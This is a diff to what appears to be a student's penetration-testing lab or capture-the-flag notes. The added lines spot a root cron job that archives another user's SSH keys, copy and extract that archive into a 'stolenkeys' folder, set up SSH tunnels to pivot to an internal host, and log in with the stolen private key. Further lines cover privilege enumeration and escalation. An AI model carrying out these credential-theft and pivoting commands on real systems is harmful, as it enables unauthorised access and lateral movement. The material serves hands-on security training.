@@ -3096,3 +3096,52 @@ map.png     100% 25kb
 now we have it we can EOG (copy from linux to windows)
 
 pscp student@10.50.37.42:/home/student/map.png C:\Users\student\Desktop
+
+located private key
+
+www-data@extranet:~$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+*  *    * * *   root    tar -C /home/comrade/ -czf /tmp/backup.tar.gz .ssh/
+www-data@extranet:~$ 
+
+
+now we can scp /tmp/backup.tar.gz
+
+scp -P 8999 www-data@127.0.0.1:/tmp/backup.tar.gz .
+
+mkdir stolenkeys
+
+tar -xvzf backup.tar.gz -C stolenkeys
+
+tunnel from the 100 to the 192.168.150.253
+ssh -MS /tmp/key1 www-data@127.0.0.1 -p 8999
+ssh -S /tmp/key1 key -O forward -L 9051:192.168.150.253:3201
+ssh -i /home/student/stolenkeys/.ssh/id_rsa comrade@127.0.0.1 -p 9051
+
+
+
+Enumerate items that would be related to jobs and tasks that running on the host, you may need to use higher privileges.
+
+sudo cat syslog
+
+find / -name "*rkhunter*" 2>/dev/null
+cat /etc/rkhunter.conf
+ for flag
+
+
+
+sudo su
